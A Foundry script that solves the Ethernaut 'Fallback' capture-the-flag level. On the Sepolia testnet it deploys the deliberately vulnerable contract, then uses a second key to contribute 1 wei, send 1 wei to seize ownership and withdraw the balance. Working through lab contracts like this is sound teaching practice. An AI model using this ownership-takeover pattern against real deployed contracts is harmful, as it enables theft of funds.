// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Fallback} from "../src/Fallback.sol";

// Our Instance address: https://sepolia.etherscan.io/address/0xd4b84cb614d2d55ae64941783dc94b38523b09bf

contract FallbackSolution is Script {
    // $ source .env      # This is to store the environmental variables in the shell session
    // $ forge script script/Fallback.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

    function run() external {
        // Deploy Fallback contract (It is better to deploy your instance for the contract to avoid errors)
        Fallback fallbackInstance = _deployFallbackContract();
        // We will simulate the attack by the second address in the .env file
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(attackerPrivateKey);
        console.log("Owner:", fallbackInstance.owner());
        // Fire `Fallback::contribute` to store our name in `contributions`
        fallbackInstance.contribute{value: 1 wei}();
        // Send ETH to the `fallbackInstance`, and since we are from the contributers, we will my the new owners
        (bool success,) = address(fallbackInstance).call{value: 1 wei}("");
        require(success, "Revert sending 1 wei to `fallbackInstance`");
        console.log("New Owner:", fallbackInstance.owner()); // We became the owners
        // Since we are the new owners, we can withdraw the ETH easily
        fallbackInstance.withdraw();
        console.log("fallbackInstance balance", address(fallbackInstance).balance);

        vm.stopBroadcast();
    }

    function _deployFallbackContract() internal returns (Fallback) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Fallback fallbackInstance = new Fallback();
        console.log("Fallback address:", address(fallbackInstance));
        vm.stopBroadcast();
        return fallbackInstance;
    }
}
